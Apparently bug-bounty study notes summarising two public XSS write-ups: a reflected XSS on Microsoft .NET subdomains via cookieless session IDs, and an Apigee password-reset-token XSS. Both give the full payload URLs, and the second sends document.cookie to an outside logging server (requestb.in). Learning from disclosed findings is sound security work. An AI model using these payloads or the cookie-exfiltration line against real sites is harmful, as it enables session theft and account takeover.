### 1. [Reflected XSS on Microsoft subdomains](https://infosecwriteups.com/reflected-xss-on-microsoft-com-subdomains-4bdfc2c716df)

##### **What Happended**
Reflected XSS in Microsoft's .NET subdomains caused by improper HTML encoding of "cookieless" session identifiers. 
The researcher found it by scanning microsoft.com subdomains and testing .NET-specific ~/ URL resolution patterns.

##### **Tools Used**
- **[Assetfinder](https://github.com/tomnomnom/assetfinder)** - Subdomain enumeration
- **[Httprobe](https://github.com/tomnomnom/httprobe)** - Check live hosts  
- **[Cookieless](https://github.com/RealLinkers/cookieless)** - Custom tool for testing .NET cookieless sessions
  
##### **Payload Used**
*https://gallery.technet.microsoft.com/(A(%22onerror='alert%601%60'testabcd))/*

- The Researcher's Method: Recon: assetfinder microsoft.com | httprobe → Find live subdomains -> Filter: cookieless tool to detect .NET cookieless patterns -> Test: Try breaking out of the session ID context with XSS payloads -> Verify: Found 4 vulnerable subdomains



### 2. [Google Acquisition XSS (Apigee)](https://medium.com/@TnMch/google-acquisition-xss-apigee-5479d7b5dc4)

##### **What Happended**
This bug was in a non-obvious place—a password reset token. Always test all parameters you can control. XSS vulnerability was found in Apigee's password reset page. When users clicked a password reset link, the token value from the URL was inserted directly into the page without being sanitized. This allowed the attacker to inject a script that would steal the user's cookies.

##### **Tools Used**
Burp Suite (for testing and intercepting requests)

##### **Payload Used**
*https://api.accounts.apigee.com/management/users/xxxxxx/resetpw?token=xxxxxxx"><script>new Image().src='https://requestb.in/xxxxxx?code='+document.cookie</script><a href="*
                                                                                                                                                       
The "><script> closes the existing HTML tag and injects a script. The script creates an invisible image that sends the user's document.cookie to an external logging server (requestb.in). The final <a href=" is to "fix" the HTML and avoid breaking the page visibly.
